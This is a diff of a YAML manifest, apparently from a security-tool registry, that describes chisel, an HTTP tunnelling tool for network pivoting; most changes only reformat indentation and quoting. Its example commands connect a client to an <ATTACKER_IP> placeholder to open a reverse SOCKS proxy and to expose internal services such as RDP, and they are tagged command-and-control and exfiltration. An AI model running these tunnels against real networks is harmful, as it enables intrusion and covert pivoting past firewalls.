@@ -2,109 +2,113 @@
 id: security-tunnel-chisel
 namespace: security:tunnel:chisel
 name: chisel
-description: Fast TCP/UDP tunnel over HTTP, used for network pivoting and port
-  forwarding through restrictive firewalls using a single binary with no dependencies.
-author: "Repository Maintainers"
-version: "1.0.0"
+description: Fast TCP/UDP tunnel over HTTP, used for network pivoting and port forwarding
+  through restrictive firewalls using a single binary with no dependencies.
+author: Repository Maintainers
+version: 1.0.0
 capabilities:
-  - network.tunnel.http
-  - network.forward.port
-  - network.forward.reverse
-  - network.proxy.socks
-  - security.pivot.traffic
+- network.tunnel.http
+- network.forward.port
+- network.forward.reverse
+- network.proxy.socks
+- security.pivot.traffic
 platforms:
-  - linux
-  - macos
-  - windows
+- linux
+- macos
+- windows
 risk_level: medium
 trust_level: verified
 execution_policy: enabled
 architectures:
-  - amd64
-  - arm64
+- amd64
+- arm64
 dependencies: []
 related_tools:
-  - socat
-  - ssh
+- socat
+- ssh
 contract:
   inputs:
-    - type: network.target.ip
-      description: Chisel server IP
-    - type: network.port
-      description: Chisel server port
+  - type: network.target.ip
+    description: Chisel server IP
+  - type: network.port
+    description: Chisel server port
   outputs:
-    - type: network.tunnel
-      description: Encrypted tunnel over HTTP
+  - type: network.tunnel
+    description: Encrypted tunnel over HTTP
   side_effects:
-    - network_traffic
-    - raw_socket_access
+  - network_traffic
+  - raw_socket_access
 resource_profile:
   cpu: low
   memory_mb: 16
   network: medium
   disk_io: low
 allowed-tools:
-  - chisel
+- chisel
 parameters:
-  - name: mode
-    type: string
-    required: true
-    description: "Mode: server or client"
-  - name: port
-    type: integer
-    required: false
-    default_value: 8080
-    description: "Listening port"
-  - name: reverse
-    type: boolean
-    required: false
-    description: "Enable reverse tunneling"
-  - name: socks
-    type: boolean
-    required: false
-    description: "Enable SOCKS proxy"
-  - name: remote
-    type: string
-    required: false
-    description: "Remote forward specification (e.g., R:socks or R:port:host:port)"
+- name: mode
+  type: string
+  required: true
+  description: 'Mode: server or client'
+- name: port
+  type: integer
+  required: false
+  default_value: 8080
+  description: Listening port
+- name: reverse
+  type: boolean
+  required: false
+  description: Enable reverse tunneling
+- name: socks
+  type: boolean
+  required: false
+  description: Enable SOCKS proxy
+- name: remote
+  type: string
+  required: false
+  description: Remote forward specification (e.g., R:socks or R:port:host:port)
 global_vars:
   port: port
 execution:
-  template: "chisel server -p {port} --reverse"
+  template: chisel server -p {port} --reverse
   sandbox: execFile
   timeout_seconds: 86400
   shell: false
 examples:
-  - description: "Start chisel server in reverse mode on attacking machine"
-    command: chisel server -p 8080 --reverse
-  - description: "Connect client to server with reverse port forwarding"
-    command: chisel client <ATTACKER_IP>:8080 R:8888:<INTERNAL_IP>:80
-  - description: "Reverse SOCKS proxy (tunnel all traffic through target)"
-    command: chisel client <ATTACKER_IP>:8080 R:socks
-  - description: "Remote port forwarding (expose internal service on attacker port)"
-    command: chisel client <ATTACKER_IP>:8080 R:8888:localhost:3389
+- description: Start chisel server in reverse mode on attacking machine
+  command: chisel server -p 8080 --reverse
+- description: Connect client to server with reverse port forwarding
+  command: chisel client <ATTACKER_IP>:8080 R:8888:<INTERNAL_IP>:80
+- description: Reverse SOCKS proxy (tunnel all traffic through target)
+  command: chisel client <ATTACKER_IP>:8080 R:socks
+- description: Remote port forwarding (expose internal service on attacker port)
+  command: chisel client <ATTACKER_IP>:8080 R:8888:localhost:3389
 references:
-  - label: "Chisel GitHub"
-    url: "https://github.com/jpillora/chisel"
+- label: Chisel GitHub
+  url: https://github.com/jpillora/chisel
 techniques:
-  - command-and-control
-  - exfiltration
+- command-and-control
+- exfiltration
 install:
-    - method: go
-      repo_url: "github.com/jpillora/chisel"
-      commands:
-        - "go install github.com/jpillora/chisel@latest"
-    - method: brew
-      package_name: "chisel"
-      commands:
-        - "brew install chisel"
+- method: go
+  repo_url: github.com/jpillora/chisel
+  commands:
+  - go install github.com/jpillora/chisel@latest
+- method: brew
+  package_name: chisel
+  commands:
+  - brew install chisel
 items:
-  - NoCreds
+- NoCreds
 services:
-  - HTTP
-  - HTTPS
+- HTTP
+- HTTPS
+features:
+- file-system
+- network-intensive
+- pipes-stdin
+- remote
 ---
-
 
 # Chisel — Fast TCP Tunnel over HTTP
 
